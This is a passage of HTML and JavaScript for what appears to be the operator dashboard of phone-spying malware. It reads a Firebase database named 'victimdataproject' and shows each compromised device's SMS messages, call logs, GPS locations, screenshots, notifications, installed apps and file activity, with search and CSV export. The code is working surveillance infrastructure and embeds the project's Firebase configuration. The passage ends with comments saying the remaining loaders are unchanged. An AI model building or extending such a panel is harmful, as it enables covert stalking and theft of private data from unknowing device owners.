                    <button class="btn btn-sm export-csv-btn btn-info mt-4" data-section="info"><i class="fas fa-file-csv"></i> Export Device Info</button>
                </div>
            </main>
        </div>
    </div>

    <!-- Bootstrap 5 JS Bundle -->
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
    <!-- Leaflet JS -->
    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>

    <script type="module">
        // Firebase v9 Modular SDK imports
        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.22.1/firebase-app.js";
        import { getAuth, signInWithEmailAndPassword, onAuthStateChanged, signOut as fbSignOut } from "https://www.gstatic.com/firebasejs/9.22.1/firebase-auth.js";
        import { getDatabase, ref, onValue, off, set, get, serverTimestamp, query, orderByChild, limitToFirst, limitToLast, startAfter, endBefore } from "https://www.gstatic.com/firebasejs/9.22.1/firebase-database.js";

        // Firebase Configuration (DO NOT SKIP)
        const firebaseConfig = {
            apiKey: "AIzaSyADpoTdgf5MZn7yPplT_cSRA8fngJvjibw", 
            authDomain: "victimdataproject.firebaseapp.com", 
            databaseURL: "https://victimdataproject-default-rtdb.firebaseio.com/", 
            projectId: "victimdataproject", 
            storageBucket: "victimdataproject.firebasestorage.app", 
            messagingSenderId: "938788267301", 
            appId: "1:938788267301:web:cdcff391160dce48fa66cc" 
        };

        // Initialize Firebase
        const app = initializeApp(firebaseConfig);
        const auth = getAuth(app);
        const database = getDatabase(app);

        // Global state
        let currentUser = null;
        let currentUID = null;
        let activeDBListeners = []; 
        let map; 
        let currentDataCache = {}; 
        let currentActiveSectionId = 'device-overview-content'; 
        let initialDataLoadedForUid = new Set(); 

        // Pagination State
        let paginationState = {}; 
        const DEFAULT_PAGE_SIZE = 15;

        // Filter State
        let filterState = {}; 


        // DOM Elements
        const loginScreen = document.getElementById('login-screen');
        const dashboardScreen = document.getElementById('dashboard-screen');
        const loginForm = document.getElementById('login-form');
        const loginError = document.getElementById('login-error');
        const adminEmailDisplay = document.getElementById('admin-email');
        const logoutButton = document.getElementById('logout-button');
        const uidSelector = document.getElementById('uid-selector');
        const sidebarLinks = document.querySelectorAll('#sidebar .nav-link');
        const contentSections = document.querySelectorAll('.content-section');
        const menuToggle = document.getElementById('menu-toggle');
        const sidebar = document.getElementById('sidebar');
        const mainContentArea = document.getElementById('main-content-area');
        const toastContainer = document.querySelector('.toast-container');
        const searchInputs = document.querySelectorAll('.search-input');


        function debounce(func, delay) {
            let timeout;
            return function(...args) {
                clearTimeout(timeout);
                timeout = setTimeout(() => func.apply(this, args), delay);
            };
        }

        function showToast(message, type = 'info', title = '') { 
            const toastId = 'toast-' + Date.now();
            let toastClass = 'bg-info-custom';
            let toastTitle = title || 'Notification';
            let toastIconHtml = '<i class="fas fa-info-circle me-2"></i>';

            if (type === 'success') {
                toastClass = 'bg-success-custom';
                toastTitle = title || 'Success';
                toastIconHtml = '<i class="fas fa-check-circle me-2"></i>';
            } else if (type === 'error') {
                toastClass = 'bg-danger-custom';
                toastTitle = title || 'Error';
                toastIconHtml = '<i class="fas fa-exclamation-triangle me-2"></i>';
            }
            
            const toastHTML = `
                <div id="${toastId}" class="toast ${toastClass}" role="alert" aria-live="assertive" aria-atomic="true" data-bs-delay="5000">
                    <div class="toast-header">
                        ${toastIconHtml}
                        <strong class="me-auto">${toastTitle}</strong>
                        <button type="button" class="btn-close" data-bs-dismiss="toast" aria-label="Close"></button>
                    </div>
                    <div class="toast-body">
                        ${message}
                    </div>
                </div>
            `;
            toastContainer.insertAdjacentHTML('beforeend', toastHTML);
            const toastElement = document.getElementById(toastId);
            const toast = new bootstrap.Toast(toastElement);
            toastElement.addEventListener('hidden.bs.toast', () => {
                toastElement.remove(); 
            });
            toast.show();
        }

        loginForm.addEventListener('submit', async (e) => {
            e.preventDefault();
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            loginError.textContent = '';
            const loginButton = loginForm.querySelector('button[type="submit"]');
            loginButton.disabled = true;
            loginButton.innerHTML = '<span class="spinner-border spinner-border-sm me-2" role="status" aria-hidden="true"></span>Logging In...';

            try {
                await signInWithEmailAndPassword(auth, email, password);
            } catch (error) {
                let friendlyMessage = "Login failed. Please check your credentials.";
                if (error.code === 'auth/user-not-found' || error.code === 'auth/wrong-password' || error.code === 'auth/invalid-credential') {
                    friendlyMessage = "Invalid email or password. Please try again.";
                } else if (error.code === 'auth/network-request-failed') {
                    friendlyMessage = "Network error. Please check your internet connection.";
                } else {
                    friendlyMessage = "An unexpected error occurred. Please try again later.";
                    console.error("Login error (raw):", error); 
                }
                loginError.textContent = friendlyMessage;
            } finally {
                loginButton.disabled = false;
                loginButton.innerHTML = '<i class="fas fa-sign-in-alt me-2"></i>Log In';
            }
        });

        logoutButton.addEventListener('click', async () => {
            if (confirm("Are you sure you want to log out?")) {
                try {
                    await fbSignOut(auth);
                    showToast("You have been successfully logged out.", "success");
                } catch (error) {
                    console.error("Logout error:", error);
                    showToast("Error logging out. Please try again.", "error");
                }
            }
        });

        onAuthStateChanged(auth, (user) => {
            currentUser = user;
            if (user) {
                adminEmailDisplay.textContent = user.email;
                loginScreen.style.display = 'none';
                dashboardScreen.style.display = 'flex';
                loadUIDs();
                showSection(currentActiveSectionId || 'device-overview-content');
            } else {
                adminEmailDisplay.textContent = '';
                loginScreen.style.display = 'block';
                dashboardScreen.style.display = 'none';
                currentUID = null;
                uidSelector.innerHTML = '<option>No devices</option>';
                detachAllDbListeners(); 
                Object.keys(paginationState).forEach(key => { 
                    if (paginationState[key] && paginationState[key].activeListener) {
                         off(paginationState[key].activeListener.ref, 'value', paginationState[key].activeListener.callback);
                    }
                });
                paginationState = {}; 
                filterState = {};
                searchInputs.forEach(input => input.value = '');
                clearAllSectionsUIState(); 
                initialDataLoadedForUid.clear();
            }
        });

        menuToggle.addEventListener('click', () => {
            sidebar.classList.toggle('active');
        });

        sidebarLinks.forEach(link => {
            link.addEventListener('click', (e) => {
                e.preventDefault();
                if (link.classList.contains('active')) return; 

                sidebarLinks.forEach(l => l.classList.remove('active'));
                link.classList.add('active');
                const sectionName = link.getAttribute('data-section');
                showSection(sectionName + '-content');
                
                if (window.innerWidth <= 992 && sidebar.classList.contains('active')) {
                    sidebar.classList.remove('active');
                }
            });
        });

        function showSection(sectionIdToShow) {
            mainContentArea.scrollTop = 0; 
            contentSections.forEach(section => {
                const searchInput = section.querySelector('.search-input');
                const sectionKey = searchInput ? searchInput.dataset.sectionkey : null;

                if (section.id === sectionIdToShow) {
                    if (section.id !== currentActiveSectionId || !section.classList.contains('active-section')) {
                        section.style.display = 'block'; 
                        setTimeout(() => { 
                            section.classList.add('active-section');
                        }, 10); 
                    }
                     if (searchInput && sectionKey && filterState[sectionKey]) {
                        searchInput.value = filterState[sectionKey].searchTerm;
                    }
                } else {
                    section.classList.remove('active-section');
                     setTimeout(() => {
                         if (!section.classList.contains('active-section')) {
                            section.style.display = 'none';
                         }
                    }, 450); 
                }
            });
            currentActiveSectionId = sectionIdToShow;

            if (sectionIdToShow === 'gps-location-content' && map) {
                setTimeout(() => { if(map) map.invalidateSize() }, 470); 
            }
        }
        
        function clearAllSectionsUIState() {
            contentSections.forEach(section => {
                const dataContainer = section.querySelector('div[id$="-data"], tbody, div[id$="-gallery"]');
                if (dataContainer) dataContainer.innerHTML = '';
                
                const loadingSpinner = section.querySelector('.loading-spinner-container');
                const noDataMessage = section.querySelector('.no-data-message-container');
                const errorMessage = section.querySelector('.error-message-container');
                const dataView = section.querySelector('div[id$="-data"], .table-responsive, #screenshots-gallery, #gps-map');
                const exportButton = section.querySelector('.export-csv-btn');
                const paginationControls = section.querySelector('.pagination-controls');
                const searchInput = section.querySelector('.search-input');

                if (loadingSpinner) loadingSpinner.style.display = 'none';
                if (noDataMessage) noDataMessage.style.display = 'flex'; 
                if (errorMessage) errorMessage.style.display = 'none';
                if (dataView) dataView.style.display = 'none';
                if (exportButton) exportButton.style.display = 'none';
                if (paginationControls) paginationControls.style.display = 'none';
                if (searchInput) searchInput.value = '';
            });
            const aliasDisplayEl = document.getElementById('device-alias-display');
            if (aliasDisplayEl) aliasDisplayEl.textContent = 'N/A';
            const statusEl = document.getElementById('device-status');
            if (statusEl) statusEl.textContent = 'N/A';
            const lastSeenEl = document.getElementById('device-last-seen');
            if (lastSeenEl) lastSeenEl.textContent = 'N/A';
            filterState = {};
        }

        function displayLoading(sectionName, isLoading) {
            const section = document.getElementById(sectionName + '-content');
            if (!section) return;
            const spinner = section.querySelector('.loading-spinner-container');
            const noData = section.querySelector('.no-data-message-container');
            const error = section.querySelector('.error-message-container');
            const dataView = section.querySelector('div[id$="-data"], .table-responsive, #screenshots-gallery, #gps-map');
            const exportButton = section.querySelector('.export-csv-btn');
            const paginationControls = section.querySelector('.pagination-controls');

            if (isLoading) {
                if (spinner) spinner.style.display = 'flex';
                if (noData) noData.style.display = 'none';
                if (error) error.style.display = 'none';
                if (dataView) dataView.style.display = 'none';
                if (exportButton) exportButton.style.display = 'none';
                if (paginationControls) paginationControls.style.display = 'none';
            } else {
                if (spinner) spinner.style.display = 'none';
            }
        }

        function displayNoData(sectionName, show) {
            const section = document.getElementById(sectionName + '-content');
            if (!section) return;
            const noData = section.querySelector('.no-data-message-container');
            const error = section.querySelector('.error-message-container');
            const dataView = section.querySelector('div[id$="-data"], .table-responsive, #screenshots-gallery, #gps-map');
            const exportButton = section.querySelector('.export-csv-btn');
            const paginationControls = section.querySelector('.pagination-controls');
            
            if (error) error.style.display = 'none'; 

            if (show) { 
                if (noData) noData.style.display = 'flex';
                if (dataView) dataView.style.display = 'none';
                if (exportButton) exportButton.style.display = 'none';
                if (paginationControls) paginationControls.style.display = 'none';
                 
                const dataContainersMap = {
                    'battery-info': 'battery-info-data', 'device-info': 'device-info-data',
                    'gps-location': 'gps-info-data', 'screenshots': 'screenshots-gallery',
                    'device-overview': 'device-overview-data'
                };
                const specificContainerId = dataContainersMap[sectionName];
                if (specificContainerId) {
                    const el = document.getElementById(specificContainerId);
                    if (el) el.innerHTML = '';
                    
                    if (sectionName === 'device-overview') {
                        const aliasDisplayEl = document.getElementById('device-alias-display');
                        if (aliasDisplayEl) aliasDisplayEl.textContent = 'N/A';
                        
                        const statusEl = document.getElementById('device-status');
                        if (statusEl) statusEl.textContent = 'N/A';
                        
                        const lastSeenEl = document.getElementById('device-last-seen');
                        if (lastSeenEl) lastSeenEl.textContent = 'N/A';
                    }
                } else { 
                    const tableBody = section.querySelector('tbody');
                    if (tableBody) tableBody.innerHTML = '';
                }
            } else { 
                if (noData) noData.style.display = 'none';
                if (dataView) {
                    const isGallery = dataView.id === 'screenshots-gallery';
                    dataView.style.display = isGallery ? 'flex' : 'block';
                }
                if (exportButton) exportButton.style.display = 'inline-block';
            }
        }

        function displayError(sectionName, show, message = "An error occurred.") {
            const section = document.getElementById(sectionName + '-content');
            if (!section) return;
            const errorContainer = section.querySelector('.error-message-container');
            const errorTextElement = section.querySelector('.error-message-container .error-text');
            const noData = section.querySelector('.no-data-message-container');
            const dataView = section.querySelector('div[id$="-data"], .table-responsive, #screenshots-gallery, #gps-map');
            const exportButton = section.querySelector('.export-csv-btn');
            const paginationControls = section.querySelector('.pagination-controls');

            if (show) {
                if (errorTextElement) errorTextElement.textContent = message;
                if (errorContainer) errorContainer.style.display = 'flex';
                if (noData) noData.style.display = 'none';
                if (dataView) dataView.style.display = 'none';
                if (exportButton) exportButton.style.display = 'none';
                if (paginationControls) paginationControls.style.display = 'none';
            } else {
                if (errorContainer) errorContainer.style.display = 'none';
            }
        }
        
        function formatTimestamp(timestamp, type = 'datetime') {
            if (timestamp === null || timestamp === undefined) return '<span class="text-muted fst-italic">N/A</span>';
            
            let numericTimestamp = timestamp;
            if (typeof timestamp === 'string') {
                numericTimestamp = parseInt(timestamp, 10);
            }

            if (typeof numericTimestamp !== 'number' || isNaN(numericTimestamp)) {
                 // console.warn("Invalid timestamp received by formatTimestamp:", timestamp);
                 return '<span class="text-danger">Invalid Date Input</span>';
            }

            try {
                const date = new Date(numericTimestamp);
                if (isNaN(date.getTime())) return '<span class="text-danger">Invalid Date</span>';
                if (type === 'date') return date.toLocaleDateString();
                if (type === 'time') return date.toLocaleTimeString();
                const optionsDate = { year: 'numeric', month: 'short', day: 'numeric' };
                const optionsTime = { hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: true };
                return `${date.toLocaleDateString(undefined, optionsDate)} ${date.toLocaleTimeString(undefined, optionsTime)}`;
            } catch (e) {
                // console.error("Error formatting timestamp:", e, "Original timestamp:", timestamp);
                return String(timestamp); 
            }
        }

        function formatDuration(seconds) {
            if (seconds === null || seconds === undefined || isNaN(seconds)) return '<span class="text-muted fst-italic">N/A</span>';
            seconds = Number(seconds);
            if (seconds < 0) return '<span class="text-muted fst-italic">N/A</span>';
            const h = Math.floor(seconds / 3600);
            const m = Math.floor((seconds % 3600) / 60);
            const s = Math.floor(seconds % 60);
            return [
                h > 0 ? `${h}h` : '',
                m > 0 ? `${m}m` : '',
                s >= 0 ? `${s}s` : '' 
            ].filter(Boolean).join(' ') || '0s';
        }

        function sanitizeHTML(str) {
            const temp = document.createElement('div');
            temp.textContent = str;
            return temp.innerHTML;
        }

        async function loadUIDs() {
            displayLoading('device-overview', true); 
            const devicesRef = ref(database, 'devices');
            try {
                const snapshot = await get(devicesRef);
                uidSelector.innerHTML = '';
                if (snapshot.exists()) {
                    const uids = Object.keys(snapshot.val());
                    if (uids.length > 0) {
                        const aliasPromises = uids.map(uid => 
                            get(ref(database, `devices/${uid}/info/alias`)).then(s => ({uid, alias: s.exists() ? s.val() : uid}))
                        );
                        const uidAliasPairs = await Promise.all(aliasPromises);

                        uidAliasPairs.forEach(pair => {
                            const option = document.createElement('option');
                            option.value = pair.uid;
                            const displayName = pair.alias && pair.alias.length > 25 ? pair.alias.substring(0,22) + '...' : (pair.alias || pair.uid);
                            option.textContent = `${displayName} (${pair.uid.substring(0,6)}...)`;
                            uidSelector.appendChild(option);
                        });

                        currentUID = uids[0]; 
                        uidSelector.value = currentUID;
                        initializeDataListenersForUID(currentUID);
                    } else {
                        uidSelector.innerHTML = '<option value="">No devices found</option>';
                        currentUID = null;
                        detachAllDbListeners();
                        clearAllSectionsUIState(); 
                        displayError('device-overview', false); 
                        displayNoData('device-overview', true); 
                    }
                } else {
                    uidSelector.innerHTML = '<option value="">No devices node in database</option>';
                    currentUID = null;
                    detachAllDbListeners();
                    clearAllSectionsUIState();
                    displayError('device-overview', false);
                    displayNoData('device-overview', true);
                }
            } catch (error) {
                console.error("Error loading UIDs:", error);
                uidSelector.innerHTML = '<option value="">Error loading devices</option>';
                detachAllDbListeners();
                clearAllSectionsUIState();
                displayLoading('device-overview', false); 
                displayNoData('device-overview', false);  
                displayError('device-overview', true, "Failed to load device list. Please check connection or configuration.");
                showToast("Could not load device list. " + error.message, "error");
            } 
        }

        uidSelector.addEventListener('change', (e) => {
            const newUID = e.target.value;
            if (newUID && newUID !== currentUID) {
                currentUID = newUID;
                initialDataLoadedForUid.clear(); 
                clearAllSectionsUIState(); 
                
                Object.keys(paginationState).forEach(key => {
                    if (paginationState[key] && paginationState[key].activeListener) {
                         off(paginationState[key].activeListener.ref, 'value', paginationState[key].activeListener.callback);
                    }
                });
                paginationState = {}; 
                
                initializeDataListenersForUID(currentUID);
            } else if (!newUID) { 
                currentUID = null;
                detachAllDbListeners(); 
                 Object.keys(paginationState).forEach(key => { 
                    if (paginationState[key] && paginationState[key].activeListener) {
                         off(paginationState[key].activeListener.ref, 'value', paginationState[key].activeListener.callback);
                    }
                });
                paginationState = {};
                filterState = {};
                searchInputs.forEach(input => input.value = '');
                clearAllSectionsUIState();
                displayError('device-overview', false);
                displayNoData('device-overview', true);
            }
        });
        
        function initializeDataListenersForUID(uid) {
            detachAllDbListeners(); 
            currentDataCache = {}; 
            if (!uid) {
                clearAllSectionsUIState();
                return;
            }
            loadDeviceOverview(uid);
            loadBatteryInfo(uid);
            loadGpsLocation(uid);
            loadScreenshots(uid); 
            loadDeviceInfo(uid);

            loadMessages(uid);
            loadCallLogs(uid);
            loadInstalledApps(uid);
            loadFileLogs(uid);
            loadNotifications(uid);
        }

        function addDbListener(dbRef, sectionName, callback) {
            activeDBListeners = activeDBListeners.filter(listener => {
                if (listener.section === sectionName && listener.uid === currentUID) {
                    off(listener.ref, listener.type, listener.callback);
                    return false; 
                }
                return true;
            });

            if (!initialDataLoadedForUid.has(`${currentUID}-${sectionName}`)) {
                displayLoading(sectionName, true);
            } else { 
                displayError(sectionName, false);
                displayNoData(sectionName, false);
            }

            const listenerCallback = (snapshot) => {
                initialDataLoadedForUid.add(`${currentUID}-${sectionName}`);
                displayLoading(sectionName, false); 
                displayError(sectionName, false); 
                callback(snapshot);
            };
            const errorCallback = (error) => {
                console.error(`Error listening to ${sectionName} for UID ${currentUID}:`, error);
                initialDataLoadedForUid.add(`${currentUID}-${sectionName}`); 
                displayLoading(sectionName, false);
                displayNoData(sectionName, false); 
                displayError(sectionName, true, `Failed to load ${sectionName.replace('-', ' ')}. Please check connection or try again.`);
                const cacheKey = sectionName.split('-')[0]; 
                 if (currentDataCache[cacheKey]) currentDataCache[cacheKey] = [];
            };
            
            const listener = onValue(dbRef, listenerCallback, errorCallback);
            activeDBListeners.push({ 
                ref: dbRef, 
                callback: listener, 
                type: 'value', 
                section: sectionName, 
                uid: currentUID 
            }); 
        }

        function detachAllDbListeners() { 
            activeDBListeners.forEach(listener => {
                 try {
                    off(listener.ref, listener.type, listener.callback); 
                 } catch(e) {
                    // console.warn("Error detaching listener:", e, listener);
                 }
            });
            activeDBListeners = [];
        }

        // --- DATA LOADING FUNCTIONS ---

        function loadDeviceOverview(uid) {
            const sectionName = 'device-overview';
            const aliasDisplay = document.getElementById('device-alias-display');
            const aliasInput = document.getElementById('device-alias-input');
            const statusDisplay = document.getElementById('device-status');
            const lastSeenDisplay = document.getElementById('device-last-seen');
            const editAliasBtn = document.getElementById('edit-alias-btn');
            const saveAliasBtn = document.getElementById('save-alias-btn');
            const cancelAliasBtn = document.getElementById('cancel-alias-btn');
            const editAliasForm = document.getElementById('edit-alias-form');

            const overviewRef = ref(database, `devices/${uid}/info`);
            addDbListener(overviewRef, sectionName, (snapshot) => {
                const dataContainer = document.getElementById('device-overview-data');
                // console.log(`[loadDeviceOverview] Snapshot for UID ${uid}:`, snapshot.val()); 

                if (snapshot.exists()) {
                    dataContainer.style.display = 'block'; 
                    const data = snapshot.val() || {};
                    // console.log("[loadDeviceOverview] Data from snapshot:", data);
                    currentDataCache['device-overview'] = [data]; 
                    
                    if(aliasDisplay) aliasDisplay.textContent = sanitizeHTML(data.alias || uid);
                    if(aliasInput) aliasInput.value = data.alias || uid;
                    // console.log("[loadDeviceOverview] Alias set to:", data.alias || uid);

                    if(statusDisplay) {
                        // console.log("[loadDeviceOverview] Raw status from DB:", data.status);
                        if (data.status && String(data.status).toLowerCase() === "online") {
                            statusDisplay.innerHTML = `<span class="badge bg-success-soft text-success-dark rounded-pill py-1 px-2"><i class="fas fa-circle fa-xs me-1"></i>Online</span>`;
                        } else {
                            const lastSeenRaw = data.last_seen; 
                            // console.log("[loadDeviceOverview] Raw last_seen from DB for status:", lastSeenRaw);
                            const lastSeenTimestamp = lastSeenRaw ? parseInt(String(lastSeenRaw), 10) : null;
                            // console.log("[loadDeviceOverview] Parsed lastSeenTimestamp for status:", lastSeenTimestamp);

                            if (lastSeenTimestamp && !isNaN(lastSeenTimestamp)) {
                                const twentyMinutesAgo = Date.now() - (20 * 60 * 1000);
                                statusDisplay.innerHTML = lastSeenTimestamp > twentyMinutesAgo 
                                    ? `<span class="badge bg-success-soft text-success-dark rounded-pill py-1 px-2"><i class="fas fa-circle fa-xs me-1"></i>Online (Recent)</span>`
                                    : `<span class="badge bg-danger-soft text-danger-dark rounded-pill py-1 px-2"><i class="fas fa-circle fa-xs me-1"></i>Offline</span>`;
                            } else {
                                statusDisplay.innerHTML = `<span class="badge bg-secondary-soft text-secondary-dark rounded-pill py-1 px-2">Unknown</span>`;
                            }
                        }
                        // console.log("[loadDeviceOverview] Status display HTML:", statusDisplay.innerHTML);
                    }


                    if(lastSeenDisplay) {
                        const lastSeenRawForDisplay = data.last_seen;
                        // console.log("[loadDeviceOverview] Raw last_seen for display:", lastSeenRawForDisplay);
                        const lastSeenTimestampForDisplay = lastSeenRawForDisplay ? parseInt(String(lastSeenRawForDisplay), 10) : null;
                        // console.log("[loadDeviceOverview] Parsed lastSeenTimestamp for display:", lastSeenTimestampForDisplay);

                        if (lastSeenTimestampForDisplay && !isNaN(lastSeenTimestampForDisplay)) {
                            lastSeenDisplay.innerHTML = formatTimestamp(lastSeenTimestampForDisplay);
                        } else {
                            lastSeenDisplay.innerHTML = formatTimestamp(null);
                        }
                        // console.log("[loadDeviceOverview] Last seen display HTML:", lastSeenDisplay.innerHTML);
                    }
                    
                    displayNoData(sectionName, false); 
                } else {
                    // console.log("[loadDeviceOverview] Snapshot does not exist or is empty for UID:", uid);
                    if(dataContainer) dataContainer.style.display = 'none'; 
                    displayNoData(sectionName, true); // This will also reset alias, status, lastSeen if elements exist
                }
            });

            // Keep event listeners for alias editing
            if (editAliasBtn) editAliasBtn.onclick = () => { /* ... */ };
            if (cancelAliasBtn) cancelAliasBtn.onclick = () => { /* ... */ };
            if (saveAliasBtn) saveAliasBtn.onclick = async () => { /* ... */ };
        }
        
        function loadTableData(uid, dataPathInFirebase, sectionKey, tableBodyId, columns, dataProcessor, sortConfig) {
            const tableBody = document.getElementById(tableBodyId);
            const firebaseDataRef = ref(database, `devices/${uid}/${dataPathInFirebase}`);

            if (!paginationState[sectionKey]) {
                paginationState[sectionKey] = {
                    currentPage: 1, pageSize: DEFAULT_PAGE_SIZE,
                    cursors: [null], sortField: sortConfig.field, sortDirection: sortConfig.direction,
                    activeListener: null, itemCountOnPage: 0, hasMoreRawData: false
                };
            }
            if (!filterState[sectionKey]) {
                filterState[sectionKey] = { searchTerm: "" };
            }

            const sectionPaging = paginationState[sectionKey];
            
            if (sectionPaging.activeListener && sectionPaging.activeListener.ref) {
                off(sectionPaging.activeListener.ref, 'value', sectionPaging.activeListener.callback);
                sectionPaging.activeListener = null;
            }
            
            activeDBListeners = activeDBListeners.filter(l => !(l.section === sectionKey && l.uid === uid && l.type === 'value'));

            displayLoading(sectionKey, true);

            let fbQuery;
            const orderByFld = sectionPaging.sortField;
            const currentQueryCursorValue = sectionPaging.cursors[sectionPaging.currentPage - 1]; 

            const baseQuery = query(firebaseDataRef, orderByChild(orderByFld));
            const itemsToFetch = sectionPaging.pageSize + 1;

            if (sectionPaging.sortDirection === 'desc') { 
                if (currentQueryCursorValue !== null && currentQueryCursorValue !== undefined) {
                    fbQuery = query(baseQuery, endBefore(currentQueryCursorValue), limitToLast(itemsToFetch));
                } else { 
                    fbQuery = query(baseQuery, limitToLast(itemsToFetch));
                }
            } else { 
                if (currentQueryCursorValue !== null && currentQueryCursorValue !== undefined) {
                    fbQuery = query(baseQuery, startAfter(currentQueryCursorValue), limitToFirst(itemsToFetch));
                } else {
                    fbQuery = query(baseQuery, limitToFirst(itemsToFetch));
                }
            }

            const listenerCallback = (snapshot) => {
                initialDataLoadedForUid.add(`${currentUID}-${sectionKey}`);
                displayLoading(sectionKey, false);
                displayError(sectionKey, false);
                if (tableBody) tableBody.innerHTML = ''; // Check if tableBody exists
                
                let dataFromFirebase = []; 
                sectionPaging.hasMoreRawData = false;

                if (snapshot.exists()) {
                    const rawData = snapshot.val();
                    Object.keys(rawData).forEach(key => {
                        if (rawData[key]) dataFromFirebase.push({ ...rawData[key], _fbKey: key });
                    });

                    if (sectionPaging.sortDirection === 'desc') dataFromFirebase.reverse();
                    
                    if (dataFromFirebase.length > sectionPaging.pageSize) {
                        sectionPaging.hasMoreRawData = true;
                        // The cursor should be the sortField value of the *last item on the current page* if going forward (asc)
                        // or the *first item on the current page* if going backward (desc with limitToLast)
                        // For simplicity, if pageSize is 15, and we fetched 16, the 15th item (index 14) is the last on page.
                        // The 16th item (index 15) is the first of the *next* page.
                        const cursorCandidateItem = dataFromFirebase[sectionPaging.pageSize -1]; 
                        if (cursorCandidateItem && cursorCandidateItem[orderByFld] !== undefined) {
                           sectionPaging.cursors[sectionPaging.currentPage] = cursorCandidateItem[orderByFld];
                        }
                        dataFromFirebase = dataFromFirebase.slice(0, sectionPaging.pageSize);
                    } else {
                        sectionPaging.hasMoreRawData = false;
                        if(dataFromFirebase.length > 0) {
                             const lastItemOnPage = dataFromFirebase[dataFromFirebase.length -1];
                             if (lastItemOnPage && lastItemOnPage[orderByFld] !== undefined) {
                                sectionPaging.cursors[sectionPaging.currentPage] = lastItemOnPage[orderByFld]; 
                            }
                        }
                    }
                    
                    let clientFilteredDisplayArray = [];
                    const searchTermFromState = (filterState[sectionKey] && filterState[sectionKey].searchTerm)
                                               ? filterState[sectionKey].searchTerm.toLowerCase()
                                               : "";

                    if (searchTermFromState) {
                        clientFilteredDisplayArray = dataFromFirebase.filter(item => {
                            if (sectionKey === 'messages') {
                                return (item.address && String(item.address).toLowerCase().includes(searchTermFromState)) ||
                                       (item.body && String(item.body).toLowerCase().includes(searchTermFromState));
                            } else if (sectionKey === 'call-logs') {
                                return (item.number && String(item.number).toLowerCase().includes(searchTermFromState));
                            } else if (sectionKey === 'installed-apps') {
                                return (item.appName && String(item.appName).toLowerCase().includes(searchTermFromState)) ||
                                       (item.packageName && String(item.packageName).toLowerCase().includes(searchTermFromState));
                            } else if (sectionKey === 'file-logs') {
                                return (item.path && String(item.path).toLowerCase().includes(searchTermFromState));
                            } else if (sectionKey === 'notifications') {
                                return (item.appName && String(item.appName).toLowerCase().includes(searchTermFromState)) ||
                                       (item.title && String(item.title).toLowerCase().includes(searchTermFromState)) ||
                                       (item.text && String(item.text).toLowerCase().includes(searchTermFromState));
                            }
                            return true; 
                        });
                    } else {
                        clientFilteredDisplayArray = dataFromFirebase;
                    }
                                                       
                    sectionPaging.itemCountOnPage = clientFilteredDisplayArray.length;
                    currentDataCache[dataPathInFirebase + '_page'] = clientFilteredDisplayArray; 

                    if (clientFilteredDisplayArray.length > 0) {
                        clientFilteredDisplayArray.forEach(item => {
                            const row = tableBody.insertRow();
                            const processedItem = dataProcessor ? dataProcessor(item) : item;
                            columns.forEach(col => {
                                const cell = row.insertCell();
                                let value = processedItem[col.key];
                                if (col.formatter) value = col.formatter(value, processedItem);
                                else value = value !== null && value !== undefined ? sanitizeHTML(String(value)) : '<span class="text-muted fst-italic">N/A</span>';
                                cell.innerHTML = value;
                            });
                        });
                        displayNoData(sectionKey, false);
                    } else { 
                        let noDataMsg;
                        if (searchTermFromState) {
                            if (dataFromFirebase.length > 0 && sectionPaging.hasMoreRawData) { 
                                 noDataMsg = `आपकी खोज "${sanitizeHTML(searchTermFromState)}" से इस पेज पर कोई आइटम नहीं मिला। अगले पेज पर और आइटम हो सकते हैं।`;
                            } else if (dataFromFirebase.length > 0 && sectionPaging.currentPage > 1) { 
                                 noDataMsg = `आपकी खोज "${sanitizeHTML(searchTermFromState)}" से इस पेज पर कोई आइटम नहीं मिला।`;
                            }
                             else { 
                                noDataMsg = `आपकी खोज "${sanitizeHTML(searchTermFromState)}" से कोई आइटम नहीं मिला।`;
                            }
                        } else { 
                            noDataMsg = "इस डिवाइस के लिए कोई आइटम नहीं मिला।";
                        }

                        if (sectionPaging.currentPage === 1 && !searchTermFromState && !snapshot.exists()) {
                            displayNoData(sectionKey, true); 
                        } else {
                            if(tableBody) tableBody.innerHTML = `<tr><td colspan="${columns.length}" class="text-center text-muted p-4 fst-italic">${noDataMsg}</td></tr>`;
                            displayNoData(sectionKey, false); 
                        }
                    }
                } else { 
                     const searchTermFromStateOnError = (filterState[sectionKey] && filterState[sectionKey].searchTerm) ? filterState[sectionKey].searchTerm.toLowerCase() : "";
                     const noDataMsg = (searchTermFromStateOnError && sectionPaging.currentPage === 1) 
                                        ? `आपकी खोज "${sanitizeHTML(searchTermFromStateOnError)}" से कोई आइटम नहीं मिला।`
                                        : (sectionPaging.currentPage === 1 ? "इस डिवाइस के लिए कोई आइटम नहीं मिला।" : "इस पेज पर कोई आइटम नहीं मिला।");

                    if (sectionPaging.currentPage === 1 && !searchTermFromStateOnError) {
                        displayNoData(sectionKey, true);
                    } else {
                         if(tableBody) tableBody.innerHTML = `<tr><td colspan="${columns.length}" class="text-center text-muted p-4 fst-italic">${noDataMsg}</td></tr>`;
                         displayNoData(sectionKey, false);
                    }
                    currentDataCache[dataPathInFirebase + '_page'] = [];
                    sectionPaging.itemCountOnPage = 0;
                    sectionPaging.hasMoreRawData = false;
                }
                updatePaginationControlsUI(sectionKey);
            };
            
            const errorCallback = (error) => {
                console.error(`Error listening to ${sectionKey} for UID ${currentUID}:`, error);
                initialDataLoadedForUid.add(`${currentUID}-${sectionKey}`);
                displayLoading(sectionKey, false);
                displayNoData(sectionKey, false);
                displayError(sectionKey, true, `Failed to load ${sectionKey.replace('-', ' ')}. Error: ${error.message}`);
                currentDataCache[dataPathInFirebase + '_page'] = [];
                sectionPaging.itemCountOnPage = 0;
                sectionPaging.hasMoreRawData = false;
                updatePaginationControlsUI(sectionKey);
            };

            const unsubscribe = onValue(fbQuery, listenerCallback, errorCallback);
            sectionPaging.activeListener = { ref: fbQuery, callback: listenerCallback, unsubscribe: unsubscribe };
        }

        // ... (बाकी के सभी फंक्शन्स जैसे updatePaginationControlsUI, event listeners, loadMessages, etc. वैसे ही रहेंगे)
        // ... (loadBatteryInfo, loadGpsLocation, etc. भी वैसे ही रहेंगे)
        // ... (loadDeviceInfo में भी keyOrder और iconsMap में last_seen का ध्यान रखा गया है)
